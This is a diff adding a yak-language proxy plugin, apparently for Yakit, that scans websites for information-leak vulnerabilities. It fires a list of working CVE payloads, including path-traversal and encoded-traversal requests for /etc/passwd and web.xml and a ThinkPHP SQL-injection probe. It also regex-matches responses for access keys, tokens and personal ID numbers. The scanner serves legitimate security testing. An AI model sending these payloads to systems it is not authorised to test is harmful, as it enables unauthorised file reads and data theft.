@@ -1,0 +1,339 @@
+// 包含了常见的以下四类场景漏洞
+
+//信息泄露
+//目录穿越
+//路径穿越
+//文件读取
+
+// check_rule 数据格式说明
+// req_method HTTP请求方法
+// payload HTTP请求路径
+// header_fuzz_payload 对HTTP请求头中的header进行fuzz，key为header名，value为header值
+// body_fuzz_payload 对HTTP请求中的body进行fuzz
+// rsp_status_code HTTP响应状态码
+// rsp_flag HTTP响应中的特征字符串
+// vul_name CVE编号或漏洞中文名称
+
+recognition_patten_dic={
+    "1":"字典模式",
+    "2":"机器学习模式",
+    "3":"字典模式优先-机器学习辅助",
+    "4":"字典模式-机器学习并行",
+    "5":"机器学习优先-字典模式辅助",
+}
+
+//开始替换内容标志recognition_patten
+//待替换内容，勿动！
+recognition_patten=cli.StringSlice("recognition_patten", cli.setVerboseName("识别模式"),cli.setMultipleSelect(false),cli.setSelectOption("字典模式", "1"),cli.setSelectOption("机器学习模式", "2"),cli.setSelectOption("字典模式优先-机器学习辅助", "3"),cli.setSelectOption("字典模式-机器学习并行", "4"),cli.setSelectOption("机器学习优先-字典模式辅助", "5"),cli.setDefault("1"),cli.setHelp("检测识别模式"),cli.setCliGroup("插件额外参数"))
+//结束替换内容标志recognition_patten
+
+//开始替换内容标志task_type
+//待替换内容，勿动！
+task_type=cli.StringSlice("task_type", cli.setVerboseName("任务类型"),cli.setMultipleSelect(false),cli.setSelectOption("即时", "即时"),cli.setDefault("即时"),cli.setHelp("任务类型，mitm都为即时任务"),cli.setCliGroup("插件额外参数"))
+//结束替换内容标志task_type
+
+
+cli.check()
+
+base_info_script_name = "常见信息泄露检测"
+base_info_task_creater = ""
+base_info_task_type = "即时"
+base_info_detect_mode = "mitm"
+base_info_task_mode = recognition_patten_dic[recognition_patten[0]]
+base_info_login = ""
+base_info_crediential = ""
+base_info_user_define_header = ""
+base_info_start_time = time.Now().String()
+base_info_end_time = ""
+
+
+// 定义打印函数
+base_info_output=func(){
+    yakit_output(f"加载插件结束。配置的基本信息如下：任务名称为'${base_info_script_name}'、任务创建人为'${base_info_task_creater}'、任务类型为'${base_info_task_type}任务'、检测模式为'${base_info_detect_mode}模式'、任务模式为'${base_info_task_mode}'、登录入口信息为'${base_info_login}'、凭证信息为'${base_info_crediential}'、自定义请求头信息为'${base_info_user_define_header}'、任务开始时间为 ${base_info_start_time}、结束时间为${base_info_end_time}。")
+}
+base_info_output()
+
+GET="GET"
+POST="POST"
+detect_output_dic={}
+risk_output_dic={}
+flow_total=-1
+
+description="信息泄露漏洞是指系统或应用程序中存在的安全漏洞，导致敏感信息被未经授权的个人或实体获取或披露。这些信息可能包括个人身份信息、财务信息、健康信息、商业机密等。信息泄露漏洞可能会对组织、个人和客户造成严重的负面影响，包括财务损失、声誉受损和法律责任。"
+solution="1.加密敏感数据：确保存储在数据库、日志文件或其他存储介质中的敏感数据是加密的。使用强大的加密算法对数据进行加密，以确保即使数据泄露，也难以解密。\n2.安全传输：确保在数据传输过程中使用安全的协议，如 HTTPS。通过加密传输数据，防止数据在传输过程中被窃取或篡改。\n3.访问控制：实施严格的访问控制策略，限制对敏感数据的访问权限。只授权给有必要的人员访问敏感信息，避免数据被未授权的人员访问。\n4.安全配置：确保系统和应用程序的配置符合安全最佳实践。定期审查和更新配置，避免因配置错误导致信息泄露。\n5.安全开发实践：在开发过程中采用安全编码实践，避免常见的安全漏洞，如跨站脚本（XSS）、SQL 注入等。进行安全代码审查和漏洞扫描，及时修复发现的安全问题。\n6.员工培训：加强员工的安全意识培训，教育员工如何处理敏感信息、识别社会工程攻击，并遵守数据保护和隐私政策。\n7.监控和审计：建立全面的日志记录和审计机制，监控系统活动并及时发现异常行为。定期审查日志以识别潜在的信息泄露事件，并采取相应的措施。"
+
+check_rule_list=[
+    {
+        "req_method":GET,
+        "payload":`/%2e/WEB-INF/web.xml`,
+        "rsp_status_code":200,
+        "rsp_flag":`</web-app>`,
+        "vul_name":`CVE-2021-28164`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/static?/%2557EB-INF/web.xml`,
+        "rsp_status_code":200,
+        "rsp_flag":`</web-app>`,
+        "vul_name":`CVE-2021-28169`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/%u002e/WEB-INF/web.xml`,
+        "rsp_status_code":200,
+        "rsp_flag":`</web-app>`,
+        "vul_name":`CVE-2021-34429`,
+    },// 更新yak后重新测试
+    {
+        "req_method":POST,
+        "payload":`/minio/bootstrap/v1/verify`,
+        "rsp_status_code":200,
+        "rsp_flag":`MinioEndpoints`,
+        "vul_name":`CVE-2023-28432`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`,
+        "rsp_status_code":500,
+        "rsp_flag":`XPATH syntax error`,
+        "vul_name":`ThinkPHP5 SQL注入漏洞 && 敏感信息泄露`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/_plugin/head/../../../../../../../../../etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2015-3337`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2020-17519`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2021-43798`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/static/../../../a/../../../../etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2017-14849`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/..%2f..%2f..%2f..%2f..%2fetc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2018-7490`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2021-41773`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2021-42013`,
+    },// 更新yak后重新测试
+    {
+        "req_method":GET,
+        "payload":`/robots`,
+        "rsp_status_code":200,
+        "header_fuzz_payload":{`Accept`:`../../../../../../../../etc/passwd{{`},
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2019-5418`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2010-2861`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`GlassFish 任意文件读取漏洞`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/api/geojson?url=file:////etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2021-41277`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2021-43778`,
+    },
+    {
+        "req_method":GET,
+        "payload":`/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../etc/passwd`,
+        "rsp_status_code":200,
+        "rsp_flag":`root:.*?:[0-9]*:[0-9]*:`,
+        "vul_name":`CVE-2022-41840`,
+    },
+    {
+        "req_method":POST,
+        "payload":`/rest/tinymce/1/macro/preview`,
+        "rsp_status_code":200,
+        "header_fuzz_payload":{`Content-Type`:`application/json; charset=utf-8`},
+        "body_fuzz_payload":`{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}`,
+        "rsp_flag":`</web-app>`,
+        "vul_name":`CVE-2019-3396`,
+    },
+]
+
+// 规则参考 9e629c88-02d9-45aa-a396-72189fda6b22
+info_leak_payload = {"aliyun_oss_url": `[\\w-.]\\.oss.aliyuncs.com`, "access_key": `[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)`, "secret_key": `[Ss](ecret|ECRET)_?[Kk](ey|EY)`, "apikey": `api_key=[0-9a-zA-Z]{32}`, "github_access_token": `[a-zA-Z0-9_-]*:[a-zA-Z0-9_\\-]+@github\\.com*`, "稳定的 JWT 版本": `[= ]ey[A-Za-z0-9_-].[A-Za-z0-9._-]`, "所有 JWT 版本（可能误报）": `[= ]ey[A-Za-z0-9_/+-].[A-Za-z0-9._/+-]`, "内网ip地址": `(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3})|(?:172\.(?:(?:1[6-9])|(?:2\d)|(?:3[01]))\.\d{1,3}\.\d{1,3})|(?:192\.168\.\d{1,3}\.\d{1,3})`, "Swagger UI": `((swagger-ui.html)|(\"swagger\":)|(Swagger UI)|(swaggerUi)|(swaggerVersion))`, "身份证号": `[^0-9]((\d{8}(0\d|10|11|12)([0-2]\d|30|31)\d{3}$)|(\d{6}(18|19|20)\d{2}(0[1-9]|10|11|12)([0-2]\d|30|31)\d{3}(\d|X|x)))[^0-9]`, "手机号": `[^\w]((?:(?:\+|00)86)?1(?:(?:3[\d])|(?:4[5-79])|(?:5[0-35-9])|(?:6[5-7])|(?:7[0-8])|(?:8[\d])|(?:9[189]))\d{8})[^\w]`, "Java反序列化": `(javax\.faces\.ViewState)`, "AKSK泄露": `(['\"\ ](GOOG[\w\W]{10,30})['\"\ ]|(['\"\ ]AZ[A-Za-z0-9]{34,40}['\"\ ])|(['\"\ ]AKID[A-Za-z0-9]{13,20}['\"\ ])|(['\"\ ]AKIA[A-Za-z0-9]{16}['\"\ ])|(['\"\ ][a-zA-Z0-9]{8}(-[a-zA-Z0-9]{4}){3}-[a-zA-Z0-9]{12}['\"\ ])|(['\"\ ]OCID[A-Za-z0-9]{10,40}['\"\ ])|(['\"\ ]LTAI[A-Za-z0-9]{12,20}['\"\ ])|(['\"\ ][A-Z0-9]{20}$['\"\ ])|(['\"\ ]JDC_[A-Z0-9]{28,32}['\"\ ])|(['\"\ ]AK[A-Za-z0-9]{10,40}['\"\ ])|(['\"\ ]UC[A-Za-z0-9]{10,40}['\"\ ])|(['\"\ ]QY[A-Za-z0-9]{10,40}['\"\ ])|(['\"\ ]AKLT[a-zA-Z0-9-_]{16,28}['\"\ ])|(['\"\ ]LTC[A-Za-z0-9]{10,60}['\"\ ])|(['\"\ ]YD[A-Za-z0-9]{10,60}['\"\ ])|(['\"\ ]CTC[A-Za-z0-9]{10,60}['\"\ ])|(['\"\ ]YYT[A-Za-z0-9]{10,60}['\"\ ])|(['\"\ ]YY[A-Za-z0-9]{10,40}['\"\ ])|(['\"\ ]CI[A-Za-z0-9]{10,40}['\"\ ])|(['\"\ ]gcore[A-Za-z0-9]{10,30}['\"\ ]))`, "JDBC连接泄露": `(jdbc:[a-z:]+://[a-z0-9\.\-_:;=/@?,&]+)`, "HTML注释": `(<!--.*?-->)`, "企微WeCom_Key": `((corp)(id|secret))`}
+
+
+
+
+check_fuzz_result=func(result,check_rule){
+    if str.MatchAnyOfSubString(result.ResponseRaw, check_rule["rsp_flag"]) || str.MatchAnyOfRegexp(result.ResponseRaw, check_rule["rsp_flag"]){
+        risk_output(result.Url,string(result.RequestRaw),string(result.ResponseRaw),check_rule["payload"],check_rule["rsp_flag"],check_rule["vul_name"])
+    }
+}
+
+
+risk_output=func(url,req,rsp,payload,payload_success_flag,vul_name){
+
+    if task_type[0]=="即时" || task_type[0]=="定时" {
+        // 计算url和string后的body md5进行去重
+        header_md5_check,body_md5_check=poc.Split(req)
+        url_body_hash=codec.Md5(url+string(body_md5_check))
+        if url_body_hash in risk_output_dic{
+            //该条流已经告警输出，不再进行告警
+            return
+        }else{
+            //记录到告警去重字典中
+            risk_output_dic[url_body_hash]=1
+        }
+
+        //记录到检测去重字典中,借助库函数，拼接root_url和path
+        detect_root_url=str.ParseStringUrlToWebsiteRootPath(url)
+        detect_url_Instance,err=str.ParseStringUrlToUrlInstance(url)
+        if err!=nil{
+            die(err)
+        }
+        detect_path=detect_url_Instance.Path
+        detect_url_path_hash=codec.Md5(detect_root_url+detect_path)
+        if detect_url_path_hash in detect_output_dic{
+            //该条流已经检测，后续 mirrorFilteredHTTPFlow 不再进行检测
+        }else{
+            //记录到检测去重字典中
+            detect_output_dic[detect_url_path_hash]=1
+        }
+    }
+
+    risk.NewRisk(url,
+    risk.title(f"发现 ${url} 中存在 ${vul_name} 漏洞"),
+    risk.severity("middle"),
+    risk.type("信息泄露"),
+    risk.request(string(req)),
+    risk.response(string(rsp)),
+    risk.description(description),
+    risk.solution(solution),
+    risk.payload(payload),
+    risk.details({"location":url,"payload_success_flag":payload_success_flag,"poc_name":"mitm_info_leak_check","recognition_patten":recognition_patten_dic[recognition_patten[0]]}),
+    )
+}
+
+
+# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
+mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+
+    // 手动对爬虫预检测流量进行过滤，yakit加载mitm插件时，建议注释，动态爬虫形式调用无需注释（当爬虫启用crawlerx.check()需要注释）
+    // if flow_total==-1{
+    //     flow_total=flow_total+1
+    //     return
+    // }
+
+    freq=fuzz.HTTPRequest(req,fuzz.https(isHttps))~
+    freq.DisableAutoEncode(true)
+    yakit_output(f"开始对 ${url} 进行常见信息泄露检测")
+    for check_rule in check_rule_list{
+
+        fuzz_freq=freq.FuzzPath(check_rule["payload"]).FuzzMethod(check_rule["req_method"])
+        if "header_fuzz_payload" in check_rule{
+            for key,value in check_rule["header_fuzz_payload"]{
+                fuzz_freq=fuzz_freq.FuzzHTTPHeader(key,value)
+            }
+        }
+        if "body_fuzz_payload" in check_rule{
+            fuzz_freq=fuzz_freq.FuzzPostRaw(check_rule["body_fuzz_payload"])
+        }
+        result=fuzz_freq.ExecFirst()~
+        check_fuzz_result(result,check_rule)
+    }
+    yakit_output(f"完成对 ${url} 的常见信息泄露检测")
+}
+
+
+mirrorHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+
+    // 手动对爬虫预检测流量进行过滤，yakit加载mitm插件时，建议注释，动态爬虫形式调用无需注释（当爬虫启用crawlerx.check()需要注释）
+    // if flow_total==-1{
+    //     flow_total=flow_total+1
+    //     return
+    // }
+
+    detect_root_url=str.ParseStringUrlToWebsiteRootPath(url)
+    detect_url_Instance,err=str.ParseStringUrlToUrlInstance(url)
+    if err!=nil{
+        yakit_output("url 解析错误，脚本即将退出")
+        die(err)
+    }
+
+    detect_path=detect_url_Instance.Path
+    detect_url_path_hash=codec.Md5(detect_root_url+detect_path)
+    // 考虑去重策略 即时/定时 任务去重（因为任务本身也只跑一次），周期任务不去重
+    if task_type[0]=="即时" || task_type[0]=="定时"{
+        if detect_url_path_hash in detect_output_dic{
+            //该条流已经检测并告警，不再进行检测
+            yakit_output("detect_output_dic 去重")
+            return
+        }
+
+        // 计算url和string后的body md5进行去重
+        header_md5_check,body_md5_check=poc.Split(req)
+        url_body_hash=codec.Md5(url+string(body_md5_check))
+        if url_body_hash in risk_output_dic{
+            //该条流已经告警输出，不再进行检测
+            yakit_output("risk_output_dic 去重")
+            return
+        }
+    }
+
+    yakit_output(f"开始对 ${url} 进行常见信息泄露检测")
+    risk_keys,risk_info_type="",""
+    for info_type in info_leak_payload{
+        if str.MatchAnyOfRegexp(body,info_leak_payload[info_type]){
+            keys=str.RemoveRepeat(re.FindAll(body, info_leak_payload[info_type]))
+            risk_keys=risk_keys+keys
+            risk_info_type=risk_info_type+info_type+"|"
+        }
+    }
+    if risk_info_type!=""{
+        risk_output(url, req, rsp, "", risk_keys[1:], f"信息泄露(${risk_info_type[0:-1]})")
+    }
+    yakit_output(f"完成对 ${url} 的常见信息泄露检测")
+}
